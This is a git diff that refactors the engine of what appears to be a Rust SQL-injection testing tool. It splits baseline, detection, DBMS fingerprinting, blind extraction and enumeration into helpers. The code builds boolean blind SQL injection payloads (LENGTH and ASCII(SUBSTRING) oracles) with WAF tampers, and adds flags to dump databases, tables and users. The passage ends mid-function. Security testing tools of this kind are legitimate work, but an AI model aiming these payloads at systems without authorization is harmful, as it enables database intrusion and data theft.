@@ -342,10 +342,6 @@ impl Engine {
             .await
     }
 
-    // TODO(tech-debt): this is the main scan state machine (parse -> baseline ->
-    // detection -> fingerprint -> extraction); splitting it needs care to avoid
-    // regressions and isn't done blind. Tracked, not hidden.
-    #[allow(clippy::too_many_lines)]
     async fn run_internal(
         &self,
         target_str: &str,
@@ -364,20 +360,126 @@ impl Engine {
             return Ok(EngineState::Done);
         }
 
-        let cli_raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
         let candidate_param = candidate.map(crate::recon::ParameterCandidate::target_parameter);
-        // `--data` acts as a synthetic raw request (POST) so body params flow
-        // through baseline + injection like `--raw-file`. Real raw wins on conflict.
+        let raw_request = self.build_raw_request(candidate);
+
+        let Some((baseline, effective_tampers, effective_opts)) =
+            self.collect_baseline(&target, raw_request.as_ref()).await?
+        else {
+            return Ok(EngineState::Done);
+        };
+
+        current = EngineState::Detection;
+        info!(state=?current, "phase detection");
+
+        let (marker_set, to_test) = self.select_params(
+            target_str,
+            &target,
+            raw_request.as_ref(),
+            candidate_param.as_ref(),
+        );
+        let raw_request = Arc::new(raw_request);
+
+        self.run_detection(
+            &target,
+            target_str,
+            &marker_set,
+            &raw_request,
+            &baseline,
+            &effective_tampers,
+            to_test,
+        )
+        .await;
+
+        current = EngineState::Fingerprint;
+        info!(state=?current, "phase fingerprint");
+        self.run_fingerprint(
+            &target,
+            target_str,
+            &marker_set,
+            &raw_request,
+            &baseline,
+            &effective_tampers,
+            effective_opts,
+        )
+        .await;
+
+        if self.config.extract {
+            current = EngineState::Extraction;
+            info!(state=?current, "phase extraction — inference (opt-in)");
+            self.run_extraction(
+                &target,
+                target_str,
+                &marker_set,
+                &raw_request,
+                &baseline,
+                &effective_tampers,
+                effective_opts,
+            )
+            .await?;
+        }
+
+        // Enumeration phase (--dbs, --tables, --columns, --dump, --count,
+        // --banner, --current-user, --current-db, --hostname)
+        let needs_enum = self.config.dbs
+            || self.config.tables
+            || self.config.columns
+            || self.config.dump
+            || self.config.count
+            || self.config.banner
+            || self.config.current_user
+            || self.config.current_db
+            || self.config.hostname;
+        let has_findings_for_enum = !self.state.read().await.findings().is_empty();
+        if needs_enum && has_findings_for_enum {
+            current = EngineState::Enumeration;
+            info!(state=?current, "phase enumeration — dbs/tables/columns/dump");
+            self.run_enumeration(
+                &target,
+                target_str,
+                &marker_set,
+                &raw_request,
+                &baseline,
+                &effective_tampers,
+                effective_opts,
+            )
+            .await?;
+        } else if needs_enum {
+            warn!("enumeration requested but no confirmed vulnerability was found");
+        }
+
+        current = EngineState::Done;
+        let requests = self.state.read().await.request_count();
+        info!(state=?current, requests, "engine done");
+        Ok(current)
+    }
+
+    /// `--data` acts as a synthetic raw request (POST) so body params flow
+    /// through baseline + injection like `--raw-file`. Real raw wins on conflict.
+    fn build_raw_request(
+        &self,
+        candidate: Option<&crate::recon::ParameterCandidate>,
+    ) -> Option<RawRequest> {
+        let cli_raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
         if cli_raw_request.is_some() && self.config.post_data.is_some() {
             warn!("--raw-file and --data both set — raw request wins, --data ignored");
         }
-        let raw_request: Option<RawRequest> = cli_raw_request.or_else(|| {
+        cli_raw_request.or_else(|| {
             self.config
                 .post_data
                 .as_deref()
                 .and_then(synthetic_raw_from_data)
-        });
+        })
+    }
 
+    /// Collects 3 baseline samples, derives the WAF-aware effective tampers/opts.
+    /// `Ok(None)` means the run was cancelled with no samples collected — caller
+    /// should return [`EngineState::Done`] immediately.
+    async fn collect_baseline(
+        &self,
+        target: &TargetUrl,
+        raw_request: Option<&RawRequest>,
+    ) -> crate::error::Result<Option<(baseline::Baseline, Vec<Tamper>, ProbeOpts)>> {
         // Baseline: 3-5 requests (hidden when stderr is not a TTY: MCP/CI).
         let pb = spinner("collecting baseline…");
 
@@ -387,9 +489,9 @@ impl Engine {
                 break;
             }
             let start = Instant::now();
-            let spec = raw_request.as_ref().map_or_else(
+            let spec = raw_request.map_or_else(
                 || RequestSpec::get(target.as_str().to_owned()),
-                |raw| request_spec_from_raw(&target, raw),
+                |raw| request_spec_from_raw(target, raw),
             );
             let resp = self.client.send_with_retry(spec, &self.cancel).await;
             let elapsed = start.elapsed();
@@ -416,7 +518,7 @@ impl Engine {
         if samples.is_empty() {
             pb.finish_with_message("baseline failed");
             if self.cancel.is_cancelled() {
-                return Ok(EngineState::Done);
+                return Ok(None);
             }
             return Err(crate::error::InjektError::Other(Box::new(
                 std::io::Error::other(
@@ -450,10 +552,18 @@ impl Engine {
         if effective_opts.is_active() {
             info!(hpp=%effective_opts.hpp, chunked=%effective_opts.chunked, "request-level tampers active");
         }
-        current = EngineState::Detection;
-        info!(state=?current, "phase detection");
+        Ok(Some((baseline, effective_tampers, effective_opts)))
+    }
 
-        // Detection per parameter — bounded concurrency via buffer_unordered
+    /// Builds the marker-synthetic + real parameter list to test, applying
+    /// `-p` filtering (skipped when a recon `candidate_param` is already fixed).
+    fn select_params(
+        &self,
+        target_str: &str,
+        target: &TargetUrl,
+        raw_request: Option<&RawRequest>,
+        candidate_param: Option<&TargetParameter>,
+    ) -> (MarkerSet, Vec<TargetParameter>) {
         let marker_set = MarkerSet::detect(target_str);
         let mut params = Vec::new();
         // Marker mode: synthetic params, but also test real query params (don't ignore them)
@@ -479,12 +589,12 @@ impl Engine {
             ));
         }
         // Always include real query params even when markers present (fixes #6)
-        params.extend(crate::target::parameters::collect_from_url_query(&target));
+        params.extend(crate::target::parameters::collect_from_url_query(target));
         // Body params from --raw-file or --data (synthetic raw)
-        if let Some(raw) = raw_request.as_ref() {
+        if let Some(raw) = raw_request {
             params.extend(crate::target::parameters::collect_from_raw_request(raw));
         }
-        let mut to_test: Vec<TargetParameter> = if let Some(param) = candidate_param.clone() {
+        let mut to_test: Vec<TargetParameter> = if let Some(param) = candidate_param.cloned() {
             vec![param]
         } else if params.is_empty() {
             vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
@@ -505,7 +615,24 @@ impl Engine {
                 info!(filter=?self.config.test_params, before, after=%to_test.len(), "parameter filter applied");
             }
         }
+        (marker_set, to_test)
+    }
 
+    /// Runs boolean/error/time/union/stacked/json/oob detection for every
+    /// candidate parameter with bounded concurrency (respects `--threads`).
+    // One branch per technique gated by `--techniques`; splitting further would
+    // scatter the per-parameter dispatch this stream exists to keep together.
+    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
+    async fn run_detection(
+        &self,
+        target: &TargetUrl,
+        target_str: &str,
+        marker_set: &MarkerSet,
+        raw_request: &Arc<Option<RawRequest>>,
+        baseline: &baseline::Baseline,
+        effective_tampers: &[Tamper],
+        to_test: Vec<TargetParameter>,
+    ) {
         let pb2 = Arc::new(progress_bar(to_test.len() as u64));
 
         // Bounded concurrent testing per parameter (respects --threads)
@@ -514,8 +641,8 @@ impl Engine {
         let baseline_clone = baseline.clone();
         let target_clone = target.clone();
         let marker_set_clone = marker_set.clone();
-        let raw_request = Arc::new(raw_request);
-        let effective_tampers_arc = Arc::new(effective_tampers.clone());
+        let raw_request = Arc::clone(raw_request);
+        let effective_tampers_arc = Arc::new(effective_tampers.to_vec());
 
         let stream = futures::stream::iter(to_test)
             .map(|param| {
@@ -694,571 +821,665 @@ impl Engine {
 
         stream.collect::<Vec<()>>().await;
         pb2.finish_with_message("detection done");
-        current = EngineState::Fingerprint;
-        info!(state=?current, "phase fingerprint");
+    }
 
-        // Fingerprint: passive guess from error findings + banner regex, then fill missing dbms for boolean/time
-        {
-            let findings_snapshot = self.state.read().await.findings().to_vec();
-            if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&findings_snapshot) {
+    /// Passive DBMS guess from error findings + banner regex, filling any
+    /// missing `dbms` on boolean/time findings.
+    /// Recovers the injection point of the first confirmed finding (param
+    /// name + location parsed back out of `finding.parameter`), falling back
+    /// to a synthetic `id` query param when there is no finding yet. Shared
+    /// by fingerprint/extraction/enumeration, which all reuse the same
+    /// confirmed injection point.
+    async fn first_finding_param(&self, target: &TargetUrl) -> (TargetParameter, TargetUrl) {
+        let st = self.state.read().await;
+        let f = st.findings().first().cloned();
+        drop(st);
+        if let Some(finding) = f {
+            // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header")
+            let (name, loc_str) = match finding.parameter.split_once('@') {
+                Some((n, l)) => (n.to_owned(), l.to_owned()),
+                None => (finding.parameter.clone(), "query".to_owned()),
+            };
+            let location = if loc_str == "query" {
+                ParameterLocation::Query
+            } else if loc_str == "body" {
+                ParameterLocation::Body
+            } else if loc_str == "cookie" {
+                ParameterLocation::Cookie
+            } else if let Some(h) = loc_str.strip_prefix("header:") {
+                ParameterLocation::Header(h.to_owned())
+            } else {
+                // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
+                ParameterLocation::Query
+            };
+            (TargetParameter::new(name, location, "1"), target.clone())
+        } else {
+            // fallback synthetic
+            (
+                TargetParameter::new("id", ParameterLocation::Query, "1"),
+                target.clone(),
+            )
+        }
+    }
+
+    /// Passive DBMS guess from error findings + banner regex; if both are
+    /// inconclusive, falls back to one active differential probe per
+    /// candidate DBMS (see [`crate::dbms::common::DbmsDetector::fingerprint_probe`]),
+    /// stopping at the first confirmation. Only runs at all when there is
+    /// already a confirmed finding — no extra requests on a clean target.
+    #[allow(clippy::too_many_arguments)]
+    async fn run_fingerprint(
+        &self,
+        target: &TargetUrl,
+        target_str: &str,
+        marker_set: &MarkerSet,
+        raw_request: &Arc<Option<RawRequest>>,
+        baseline: &baseline::Baseline,
+        effective_tampers: &[Tamper],
+        effective_opts: ProbeOpts,
+    ) {
+        let findings_snapshot = self.state.read().await.findings().to_vec();
+        if findings_snapshot.is_empty() {
+            return;
+        }
+        if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&findings_snapshot) {
+            let mut st = self.state.write().await;
+            st.fill_missing_dbms(kind);
+            info!(dbms=%kind, "fingerprint guessed from findings");
+            return;
+        }
+        // Try banner extraction from evidences
+        for f in &findings_snapshot {
+            if let Some((kind, ver)) = crate::dbms::fingerprint::extract_banner_version(&f.evidence)
+            {
                 let mut st = self.state.write().await;
                 st.fill_missing_dbms(kind);
-                info!(dbms=%kind, "fingerprint guessed from findings");
-            } else if !findings_snapshot.is_empty() {
-                // Try banner extraction from evidences
-                for f in &findings_snapshot {
-                    if let Some((kind, ver)) =
-                        crate::dbms::fingerprint::extract_banner_version(&f.evidence)
-                    {
-                        let mut st = self.state.write().await;
-                        st.fill_missing_dbms(kind);
-                        info!(dbms=%kind, version=%ver, "fingerprint banner detected");
-                        break;
-                    }
-                }
+                info!(dbms=%kind, version=%ver, "fingerprint banner detected");
+                return;
             }
         }
+        self.active_fingerprint_probe(
+            target,
+            target_str,
+            marker_set,
+            raw_request,
+            baseline,
+            effective_tampers,
+            effective_opts,
+        )
+        .await;
+    }
 
-        if self.config.extract {
-            current = EngineState::Extraction;
-            info!(state=?current, "phase extraction — inference (opt-in)");
+    /// Sends one true/false probe pair per [`crate::dbms::DbmsKind`] against
+    /// the confirmed injection point until one confirms via the standard
+    /// boolean true/false-vs-baseline heuristic ([`BooleanDetector::evaluate`]).
+    #[allow(clippy::too_many_arguments)]
+    async fn active_fingerprint_probe(
+        &self,
+        target: &TargetUrl,
+        target_str: &str,
+        marker_set: &MarkerSet,
+        raw_request: &Arc<Option<RawRequest>>,
+        baseline: &baseline::Baseline,
+        effective_tampers: &[Tamper],
+        effective_opts: ProbeOpts,
+    ) {
+        let (param, probe_target) = self.first_finding_param(target).await;
+        let baseline_body = baseline.representative_body_str();
+        let detector = BooleanDetector::new();
+        for kind in [
+            crate::dbms::DbmsKind::MySql,
+            crate::dbms::DbmsKind::Postgres,
+            crate::dbms::DbmsKind::MsSql,
+            crate::dbms::DbmsKind::Oracle,
+        ] {
+            if self.cancel.is_cancelled() {
+                return;
+            }
+            let candidate = crate::dbms::fingerprint::get_detector(kind);
+            let (true_base, false_base) = candidate.fingerprint_probe();
+            let true_payload =
+                build_final_payload(&true_base, effective_tampers, &self.config.payload_opts);
+            let false_payload =
+                build_final_payload(&false_base, effective_tampers, &self.config.payload_opts);
 
-            // Pick first finding's param as injection point for extraction
-            let (first_param, target_for_extract) = {
-                let st = self.state.read().await;
-                let f = st.findings().first().cloned();
-                drop(st);
-                if let Some(finding) = f {
-                    // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header")
-                    let (name, loc_str) = match finding.parameter.split_once('@') {
-                        Some((n, l)) => (n.to_owned(), l.to_owned()),
-                        None => (finding.parameter.clone(), "query".to_owned()),
-                    };
-                    let location = if loc_str == "query" {
-                        ParameterLocation::Query
-                    } else if loc_str == "body" {
-                        ParameterLocation::Body
-                    } else if loc_str == "cookie" {
-                        ParameterLocation::Cookie
-                    } else if let Some(h) = loc_str.strip_prefix("header:") {
-                        ParameterLocation::Header(h.to_owned())
-                    } else {
-                        // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
-                        ParameterLocation::Query
-                    };
-                    (TargetParameter::new(name, location, "1"), target.clone())
-                } else {
-                    // fallback synthetic
-                    (
-                        TargetParameter::new("id", ParameterLocation::Query, "1"),
-                        target.clone(),
-                    )
+            let true_spec = build_injection_spec_with_raw(
+                &probe_target,
+                target_str,
+                &param,
+                &true_payload,
+                marker_set,
+                raw_request.as_ref().as_ref(),
+                effective_opts,
+                &self.config.payload_opts,
+            );
+            let start = Instant::now();
+            let true_resp = self.client.send_with_retry(true_spec, &self.cancel).await;
+            let true_ms = start.elapsed().as_secs_f64() * 1000.0;
+            self.state.write().await.increment_requests();
+            let true_body = match true_resp {
+                Ok(r) => r.text().await.unwrap_or_default(),
+                Err(_) => String::new(),
+            };
+
+            if self.cancel.is_cancelled() {
+                return;
+            }
+            let false_spec = build_injection_spec_with_raw(
+                &probe_target,
+                target_str,
+                &param,
+                &false_payload,
+                marker_set,
+                raw_request.as_ref().as_ref(),
+                effective_opts,
+                &self.config.payload_opts,
+            );
+            let start = Instant::now();
+            let false_resp = self.client.send_with_retry(false_spec, &self.cancel).await;
+            let false_ms = start.elapsed().as_secs_f64() * 1000.0;
+            self.state.write().await.increment_requests();
+            let false_body = match false_resp {
+                Ok(r) => r.text().await.unwrap_or_default(),
+                Err(_) => String::new(),
+            };
+
+            let res = detector.evaluate(
+                &baseline_body,
+                &true_body,
+                &false_body,
+                baseline.mean_ms,
+                true_ms,
+                false_ms,
+            );
+            if res.is_vulnerable && res.confidence > 0.6 {
+                self.state.write().await.fill_missing_dbms(kind);
+                info!(dbms=%kind, "active fingerprint confirmed");
+                return;
+            }
+        }
+    }
+
+    /// Opt-in (`--extract`) version-string inference: length via `LENGTH()`
+    /// binary search, then char-by-char `ASCII(SUBSTRING())` oracle.
+    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
+    async fn run_extraction(
+        &self,
+        target: &TargetUrl,
+        target_str: &str,
+        marker_set: &MarkerSet,
+        raw_request: &Arc<Option<RawRequest>>,
+        baseline: &baseline::Baseline,
+        effective_tampers: &[Tamper],
+        effective_opts: ProbeOpts,
+    ) -> crate::error::Result<()> {
+        // Pick first finding's param as injection point for extraction
+        let (first_param, target_for_extract) = self.first_finding_param(target).await;
+
+        // Determine DBMS for extraction query
+        let dbms_kind = {
+            let snap = self.state.read().await.findings().to_vec();
+            crate::dbms::fingerprint::guess_from_findings(&snap)
+                .unwrap_or(crate::dbms::DbmsKind::MySql)
+        };
+        #[allow(clippy::match_same_arms)]
+        let version_query = match dbms_kind {
+            crate::dbms::DbmsKind::MySql => "SELECT @@version",
+            crate::dbms::DbmsKind::Postgres => "SELECT version()",
+            crate::dbms::DbmsKind::MsSql => "SELECT @@version",
+            crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
+            crate::dbms::DbmsKind::Unknown => "SELECT @@version",
+        };
+
+        // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
+        let baseline_body = baseline.representative_body_str();
+        let baseline_mean = baseline.mean_ms;
+        let client_clone = self.client.clone();
+        let state_clone = Arc::clone(&self.state);
+        let cancel_clone = self.cancel.clone();
+        let target_str_clone = target_str.to_owned();
+        let target_clone2 = target_for_extract.clone();
+        let first_param_clone = first_param.clone();
+        let marker_set_clone = marker_set.clone();
+        let raw_request_clone = raw_request.as_ref().clone();
+
+        // First, infer length via LENGTH(query) if possible (try lengths 1..64)
+        // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
+        let mut inferred_len: usize = 0;
+        for len_guess in 1..=64usize {
+            if cancel_clone.is_cancelled() {
+                break;
+            }
+            #[allow(clippy::match_same_arms)]
+            let base_payload = match dbms_kind {
+                crate::dbms::DbmsKind::MySql => {
+                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
+                }
+                crate::dbms::DbmsKind::Postgres => {
+                    format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
+                }
+                crate::dbms::DbmsKind::MsSql => {
+                    format!("' AND LEN(({version_query}))>={len_guess} --")
+                }
+                crate::dbms::DbmsKind::Oracle => {
+                    format!("' AND LENGTH(({version_query}))>={len_guess} --")
+                }
+                crate::dbms::DbmsKind::Unknown => {
+                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                 }
             };
-
-            // Determine DBMS for extraction query
-            let dbms_kind = {
-                let snap = self.state.read().await.findings().to_vec();
-                crate::dbms::fingerprint::guess_from_findings(&snap)
-                    .unwrap_or(crate::dbms::DbmsKind::MySql)
-            };
-            #[allow(clippy::match_same_arms)]
-            let version_query = match dbms_kind {
-                crate::dbms::DbmsKind::MySql => "SELECT @@version",
-                crate::dbms::DbmsKind::Postgres => "SELECT version()",
-                crate::dbms::DbmsKind::MsSql => "SELECT @@version",
-                crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
-                crate::dbms::DbmsKind::Unknown => "SELECT @@version",
-            };
-
-            // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
-            let baseline_body = baseline.representative_body_str();
-            let baseline_mean = baseline.mean_ms;
-            let client_clone = self.client.clone();
-            let state_clone = Arc::clone(&self.state);
-            let cancel_clone = self.cancel.clone();
-            let target_str_clone = target_str.to_owned();
-            let target_clone2 = target_for_extract.clone();
-            let first_param_clone = first_param.clone();
-            let marker_set_clone = marker_set.clone();
-            let raw_request_clone = raw_request.as_ref().clone();
-
-            // First, infer length via LENGTH(query) if possible (try lengths 1..64)
-            // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
-            let mut inferred_len: usize = 0;
-            for len_guess in 1..=64usize {
+            let payload =
+                build_final_payload(&base_payload, effective_tampers, &self.config.payload_opts);
+            // Retry logic: require 2 probes, treat as true only if majority true
+            let mut true_count = 0usize;
+            for _ in 0..2 {
+                let spec = build_injection_spec_with_raw(
+                    &target_clone2,
+                    &target_str_clone,
+                    &first_param_clone,
+                    &payload,
+                    &marker_set_clone,
+                    raw_request_clone.as_ref(),
+                    effective_opts,
+                    &self.config.payload_opts,
+                );
+                let start = Instant::now();
+                let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
+                let ms = start.elapsed().as_secs_f64() * 1000.0;
+                state_clone.write().await.increment_requests();
+                let body = match resp {
+                    Ok(r) => r.text().await.unwrap_or_default(),
+                    Err(_) => String::new(),
+                };
+                let diff = crate::detection::response_diff::diff_against_baseline(
+                    &baseline_body,
+                    &body,
+                    baseline_mean,
+                    ms,
+                    100.0,
+                );
+                if diff.confidence < 0.4 {
+                    true_count += 1;
+                }
+                // small jitter between retries
                 if cancel_clone.is_cancelled() {
                     break;
                 }
+            }
+            let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
+            // If we saw 0 true after 2 trials, length guess exceeded
+            if !is_true {
+                inferred_len = len_guess - 1;
+                break;
+            }
+            if len_guess == 64 {
+                inferred_len = 64;
+            }
+        }
+        if inferred_len == 0 {
+            warn!("length inference failed, falling back to 16");
+            inferred_len = 16; // fallback with warning
+        }
+        info!(len=%inferred_len, "inferred version length");
+
+        // Now extract string char by char via binary search oracle
+        let engine = crate::extraction::engine::ExtractionEngine::new(
+            crate::extraction::engine::ExtractionConfig::default(),
+        );
+        let dbms_for_closure = dbms_kind;
+        let version_query_owned = version_query.to_owned();
+        let baseline_body2 = baseline_body.clone();
+        let baseline_mean2 = baseline_mean;
+        let client_for_oracle = client_clone.clone();
+        let state_for_oracle = state_clone.clone();
+        let cancel_for_oracle = cancel_clone.clone();
+        let target_for_oracle = target_clone2.clone();
+        let param_for_oracle = first_param_clone.clone();
+        let marker_for_oracle = marker_set_clone.clone();
+        let raw_for_oracle = raw_request.as_ref().clone();
+
+        let target_str_for_oracle = target_str_clone.clone();
+        let tampers_for_oracle = effective_tampers.to_vec();
+        let popts_for_oracle = self.config.payload_opts.clone();
+        let oracle = move |pos: usize, mid: u8| {
+            let client = client_for_oracle.clone();
+            let state = state_for_oracle.clone();
+            let cancel = cancel_for_oracle.clone();
+            let target = target_for_oracle.clone();
+            let param = param_for_oracle.clone();
+            let marker_set = marker_for_oracle.clone();
+            let raw = raw_for_oracle.clone();
+            let baseline_body = baseline_body2.clone();
+            let version_query = version_query_owned.clone();
+            let dbms_kind = dbms_for_closure;
+            let target_str = target_str_for_oracle.clone();
+            let tampers = tampers_for_oracle.clone();
+            let popts = popts_for_oracle.clone();
+            let opts = effective_opts;
+            async move {
+                // build ASCII(SUBSTRING) >= mid payload
                 #[allow(clippy::match_same_arms)]
-                let base_payload = match dbms_kind {
-                    crate::dbms::DbmsKind::MySql => {
-                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
-                    }
-                    crate::dbms::DbmsKind::Postgres => {
-                        format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
-                    }
-                    crate::dbms::DbmsKind::MsSql => {
-                        format!("' AND LEN(({version_query}))>={len_guess} --")
-                    }
-                    crate::dbms::DbmsKind::Oracle => {
-                        format!("' AND LENGTH(({version_query}))>={len_guess} --")
-                    }
-                    crate::dbms::DbmsKind::Unknown => {
-                        format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
-                    }
+                let base = match dbms_kind {
+                    crate::dbms::DbmsKind::MySql => format!(
+                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
+                        pos + 1,
+                        mid
+                    ),
+                    crate::dbms::DbmsKind::Postgres => format!(
+                        "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
+                        pos + 1,
+                        mid
+                    ),
+                    crate::dbms::DbmsKind::MsSql => format!(
+                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
+                        pos + 1,
+                        mid
+                    ),
+                    crate::dbms::DbmsKind::Oracle => format!(
+                        "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
+                        pos + 1,
+                        mid
+                    ),
+                    crate::dbms::DbmsKind::Unknown => format!(
+                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
+                        pos + 1,
+                        mid
+                    ),
                 };
-                let payload = build_final_payload(
-                    &base_payload,
-                    &effective_tampers,
-                    &self.config.payload_opts,
+                let payload = build_final_payload(&base, &tampers, &popts);
+                // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling
+                let spec = build_injection_spec_with_raw(
+                    &target,
+                    &target_str,
+                    &param,
+                    &payload,
+                    &marker_set,
+                    raw.as_ref(),
+                    opts,
+                    &popts,
                 );
-                // Retry logic: require 2 probes, treat as true only if majority true
-                let mut true_count = 0usize;
-                for _ in 0..2 {
-                    let spec = build_injection_spec_with_raw(
-                        &target_clone2,
-                        &target_str_clone,
-                        &first_param_clone,
-                        &payload,
-                        &marker_set_clone,
-                        raw_request_clone.as_ref(),
-                        effective_opts,
-                        &self.config.payload_opts,
-                    );
-                    let start = Instant::now();
-                    let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
-                    let ms = start.elapsed().as_secs_f64() * 1000.0;
-                    state_clone.write().await.increment_requests();
-                    let body = match resp {
-                        Ok(r) => r.text().await.unwrap_or_default(),
-                        Err(_) => String::new(),
-                    };
-                    let diff = crate::detection::response_diff::diff_against_baseline(
-                        &baseline_body,
-                        &body,
-                        baseline_mean,
-                        ms,
-                        100.0,
-                    );
-                    if diff.confidence < 0.4 {
-                        true_count += 1;
-                    }
-                    // small jitter between retries
-                    if cancel_clone.is_cancelled() {
-                        break;
-                    }
-                }
-                let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
-                // If we saw 0 true after 2 trials, length guess exceeded
-                if !is_true {
-                    inferred_len = len_guess - 1;
-                    break;
-                }
-                if len_guess == 64 {
-                    inferred_len = 64;
-                }
+                let start = Instant::now();
+                let resp = client.send_with_retry(spec, &cancel).await;
+                let ms = start.elapsed().as_secs_f64() * 1000.0;
+                state.write().await.increment_requests();
+                let body = match resp {
+                    Ok(r) => r.text().await.unwrap_or_default(),
+                    Err(_) => String::new(),
+                };
+                let diff = crate::detection::response_diff::diff_against_baseline(
+                    &baseline_body,
+                    &body,
+                    baseline_mean2,
+                    ms,
+                    100.0,
+                );
+                // similar => true (>= mid)
+                Ok::<bool, InjektError>(diff.confidence < 0.4)
             }
-            if inferred_len == 0 {
-                warn!("length inference failed, falling back to 16");
-                inferred_len = 16; // fallback with warning
+        };
+        let extracted = engine.extract(inferred_len, oracle).await?;
+        let exposed = {
+            use secrecy::ExposeSecret;
+            extracted.expose_secret().to_owned()
+        };
+        info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
+        // scrubbed hash logged, raw stored as SecretString zeroized after report
+        self.state.write().await.push_extracted(extracted);
+        Ok(())
+    }
+
+    /// Opt-in enumeration (`--dbs`/`--tables`/`--columns`/`--dump`/`--count`/
+    /// `--banner`/`--current-user`/`--current-db`/`--hostname`), reusing the
+    /// same injection point as extraction.
+    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
+    async fn run_enumeration(
+        &self,
+        target: &TargetUrl,
+        target_str: &str,
+        marker_set: &MarkerSet,
+        raw_request: &Arc<Option<RawRequest>>,
+        baseline: &baseline::Baseline,
+        effective_tampers: &[Tamper],
+        effective_opts: ProbeOpts,
+    ) -> crate::error::Result<()> {
+        // Reuse extraction context
+        let (first_param, target_for_extract) = self.first_finding_param(target).await;
+
+        let dbms_kind = {
+            let snap = self.state.read().await.findings().to_vec();
+            crate::dbms::fingerprint::guess_from_findings(&snap)
+                .unwrap_or(crate::dbms::DbmsKind::MySql)
+        };
+
+        let detector = crate::dbms::fingerprint::get_detector(dbms_kind);
+
+        let baseline_body = baseline.representative_body_str();
+        let baseline_mean = baseline.mean_ms;
+        let client = self.client.clone();
+        let state = Arc::clone(&self.state);
+        let cancel = self.cancel.clone();
+        let target_str = target_str.to_owned();
+        let marker_set = marker_set.clone();
+        let raw_request_for_enum = raw_request.as_ref().clone();
+
+        let start = self.config.start.unwrap_or(0);
+        let stop = self.config.stop.unwrap_or(100);
+
+        if self.config.dbs {
+            let query = detector.list_databases_query();
+            let extracted = extract_enum_field(
+                &client,
+                &state,
+                &cancel,
+                &target_for_extract,
+                &target_str,
+                &first_param,
+                &marker_set,
+                &baseline_body,
+                baseline_mean,
+                query.clone(),
+                "databases".to_owned(),
+                raw_request_for_enum.as_ref(),
+                effective_tampers,
+                effective_opts,
+                &dbms_kind,
+                &self.config.payload_opts,
+                &self.config.matcher,
+                &self.config.ignore_codes,
+            )
+            .await?;
+            if let Some(extracted) = extracted {
+                info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
+                self.state
+                    .write()
+                    .await
+                    .push_extracted(secrecy::SecretString::from(extracted));
             }
-            info!(len=%inferred_len, "inferred version length");
-
-            // Now extract string char by char via binary search oracle
-            let engine = crate::extraction::engine::ExtractionEngine::new(
-                crate::extraction::engine::ExtractionConfig::default(),
-            );
-            let dbms_for_closure = dbms_kind;
-            let version_query_owned = version_query.to_owned();
-            let baseline_body2 = baseline_body.clone();
-            let baseline_mean2 = baseline_mean;
-            let client_for_oracle = client_clone.clone();
-            let state_for_oracle = state_clone.clone();
-            let cancel_for_oracle = cancel_clone.clone();
-            let target_for_oracle = target_clone2.clone();
-            let param_for_oracle = first_param_clone.clone();
-            let marker_for_oracle = marker_set_clone.clone();
-            let raw_for_oracle = raw_request.as_ref().clone();
-
-            let target_str_for_oracle = target_str_clone.clone();
-            let tampers_for_oracle = effective_tampers.clone();
-            let popts_for_oracle = self.config.payload_opts.clone();
-            let oracle = move |pos: usize, mid: u8| {
-                let client = client_for_oracle.clone();
-                let state = state_for_oracle.clone();
-                let cancel = cancel_for_oracle.clone();
-                let target = target_for_oracle.clone();
-                let param = param_for_oracle.clone();
-                let marker_set = marker_for_oracle.clone();
-                let raw = raw_for_oracle.clone();
-                let baseline_body = baseline_body2.clone();
-                let version_query = version_query_owned.clone();
-                let dbms_kind = dbms_for_closure;
-                let target_str = target_str_for_oracle.clone();
-                let tampers = tampers_for_oracle.clone();
-                let popts = popts_for_oracle.clone();
-                let opts = effective_opts;
-                async move {
-                    // build ASCII(SUBSTRING) >= mid payload
-                    #[allow(clippy::match_same_arms)]
-                    let base = match dbms_kind {
-                        crate::dbms::DbmsKind::MySql => format!(
-                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
-                            pos + 1,
-                            mid
-                        ),
-                        crate::dbms::DbmsKind::Postgres => format!(
-                            "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
-                            pos + 1,
-                            mid
-                        ),
-                        crate::dbms::DbmsKind::MsSql => format!(
-                            "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
-                            pos + 1,
-                            mid
-                        ),
-                        crate::dbms::DbmsKind::Oracle => format!(
-                            "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
-                            pos + 1,
-                            mid
